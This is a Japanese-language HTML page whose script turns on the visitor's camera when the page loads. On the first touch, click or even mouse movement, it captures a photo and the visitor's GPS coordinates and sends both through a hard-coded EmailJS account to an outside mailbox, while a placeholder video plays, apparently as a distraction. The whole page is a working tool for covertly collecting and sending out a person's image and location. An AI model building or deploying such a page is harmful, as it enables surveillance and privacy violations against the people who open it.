<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>タッチで撮影＆位置情報＆動画再生＆メール送信</title>
<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
<style>
  body {
    margin: 0; padding: 0;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    height: 100vh; background: #f0f0f0;
  }
  video#videoStream, video#playVideo {
    max-width: 100%; max-height: 200px;
    margin: 10px 0;
  }
  #status {
    margin-top: 10px;
    color: green;
  }
</style>
</head>
<body>

<h2>画面に触れたら撮影＆位置情報＆動画再生＆メール送信</h2>

<!-- カメラ映像 -->
<video id="videoStream" autoplay playsinline></video>

<!-- 動画再生用 -->
<video id="playVideo" controls></video>

<div id="status"></div>

<script>
emailjs.init('cPjKBUm_i6HebDQF7');

const videoStream = document.getElementById('videoStream');
const playVideo = document.getElementById('playVideo');
const statusDiv = document.getElementById('status');

// 事前に用意したbase64動画 (mp4などをbase64に変換した文字列例)
// 例として超短い透明動画（数秒）を使います。
// 実際には適切なbase64動画データに置き換えてください。
const base64VideoData = "data:video/mp4;base64,AAAAIGZ0eXBNkN2MTAwMDA=";

// カメラ映像取得開始
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    videoStream.srcObject = stream;
  } catch (err) {
    statusDiv.textContent = "カメラのアクセスが拒否されましたまたは利用できません";
    console.error(err);
  }
}

// 写真を撮る（videoからcanvasへ）
function takePhoto() {
  const canvas = document.createElement('canvas');
  canvas.width = videoStream.videoWidth;
  canvas.height = videoStream.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');  // base64の画像データ
}

// 位置情報取得をPromise化
function getPositionPromise() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("位置情報取得はこのブラウザではサポートされていません");
    } else {
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos),
        err => reject(err.message)
      );
    }
  });
}

// EmailJSでメール送信
function sendEmail(photoData, latitude, longitude) {
  // template_2fp2jrg のテンプレート変数例
  // photo: base64画像, latitude: 緯度, longitude: 経度, video: base64動画などを入れる
  emailjs.send('service_ja2c09x', 'template_2fp2jrg', {
    photo: photoData,
    latitude: latitude,
    longitude: longitude,
    video: base64VideoData,
  })
  .then(() => {
    statusDiv.textContent = "メール送信成功！";
  }, (error) => {
    statusDiv.textContent = "メール送信に失敗しました。";
    console.error(error);
  });
}

// 画面に触れたら実行
async function onUserTouch() {
  statusDiv.textContent = "処理中...";
  const photo = takePhoto();

  try {
    const pos = await getPositionPromise();
    // 動画再生開始
    playVideo.src = base64VideoData;
    playVideo.play();

    // メール送信
    sendEmail(photo, pos.coords.latitude, pos.coords.longitude);
  } catch (e) {
    statusDiv.textContent = "位置情報取得に失敗しました: " + e;
    console.error(e);
  }
}

// イベントリスナー設定 (タッチ・マウス)
function setupTouchListeners() {
  const events = ['touchstart', 'mousedown', 'touchmove', 'mousemove'];
  events.forEach(evt => {
    window.addEventListener(evt, onUserTouch, { once: true }); // 1回だけ実行
  });
}

startCamera();
setupTouchListeners();
</script>

</body>
</html>
